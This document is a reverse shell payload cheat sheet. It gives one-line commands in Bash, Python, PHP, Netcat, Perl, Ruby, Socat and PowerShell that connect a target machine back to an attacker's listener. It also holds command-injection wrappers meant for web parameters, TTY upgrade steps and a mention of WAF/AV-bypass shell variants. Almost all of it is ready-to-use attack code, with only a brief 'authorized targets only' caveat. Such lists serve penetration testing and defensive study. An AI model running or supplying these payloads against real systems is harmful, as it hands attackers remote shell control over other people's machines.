# Reverse Shell Payload List (multi-language)
> **Author:** MD MAHABUBUR RAHMAN

Replace `YOUR-IP` / `ATTACKER-IP` and `4444`. Authorized targets only.
Test listener: `nc -lvnp 4444` (or `socat TCP-LISTEN:4444,reuseaddr -`).

## Bash
```bash
bash -i >& /dev/tcp/YOUR-IP/4444 0>&1
bash -c 'bash -i >& /dev/tcp/YOUR-IP/4444 0>&1'
0<&196;exec 196<>/dev/tcp/YOUR-IP/4444;bash <&196 >&196 2>&196
```

## Python
```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("YOUR-IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("bash")'
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR-IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## PHP
```bash
php -r '$sock=fsockopen("YOUR-IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("YOUR-IP",4444);$p=proc_open("/bin/sh",[0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]],$ps);while(!feof($sock)&&!feof($ps[1])){stream_select($r=[$sock,$ps[1],$ps[2]],$w=null,$e=null,null);if(in_array($sock,$r))fwrite($ps[0],fread($sock,1400));if(in_array($ps[1],$r))fwrite($sock,fread($ps[1],1400));if(in_array($ps[2],$r))fwrite($sock,fread($ps[2],1400));}'
php -r 'system("bash -c \"bash -i >& /dev/tcp/YOUR-IP/4444 0>&1\"");'
```
More PHP variants + WAF/AV-bypass shells: `php-reverse-shell-one-liners.txt`, `php-reverse-shell-bypass.txt`.

## Netcat
```bash
nc -e /bin/bash YOUR-IP 4444
nc -e /bin/sh YOUR-IP 4444
mkfifo /tmp/f; nc YOUR-IP 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
```

## Perl
```bash
perl -e 'use Socket;$i="YOUR-IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

## Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("YOUR-IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Socat
```bash
socat TCP:YOUR-IP:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

## PowerShell (Windows)
```powershell
powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('YOUR-IP',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
# Encoded: powershell -enc <base64-of-encoded-command>
```

## Command injection wrappers
```
; bash -i >& /dev/tcp/YOUR-IP/4444 0>&1
&& bash -i >& /dev/tcp/YOUR-IP/4444 0>&1
| bash -i >& /dev/tcp/YOUR-IP/4444 0>&1
bash -c 'bash -i >& /dev/tcp/YOUR-IP/4444 0>&1'   <- classic for web params
```

## TTY upgrade
```
python -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z -> stty raw -echo -> fg -> export TERM=xterm
# or: script -qc /bin/bash /dev/null
```

## Listener
```
nc -lvnp 4444
socat TCP-LISTEN:4444,reuseaddr,fork -
```
